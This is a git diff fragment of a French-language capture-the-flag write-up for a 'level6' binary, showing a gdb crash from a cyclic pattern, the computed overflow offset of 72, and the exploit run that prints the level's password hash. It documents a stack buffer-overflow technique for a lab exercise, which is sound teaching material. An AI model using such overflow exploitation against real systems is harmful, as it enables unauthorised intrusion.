@@ -127,9 +127,9 @@ Starting program: /home/user/level6/level6 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1A
 
 Program received signal SIGSEGV, Segmentation fault.
 0x41346341 in ?? ()
+
 (gdb) info register eip
 eip            0x41346341	0x41346341
-(gdb) 
 ```
 
 L'offset pour son exploit est donc [72](https://wiremask.eu/tools/buffer-overflow-pattern-generator/).
@@ -142,4 +142,3 @@ On va donc envoyer en argument de notre binaire *72 bytes* + l'adresse la foncti
 :~$ ./level6 $(cat /tmp/level6)
 f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
 ```
-
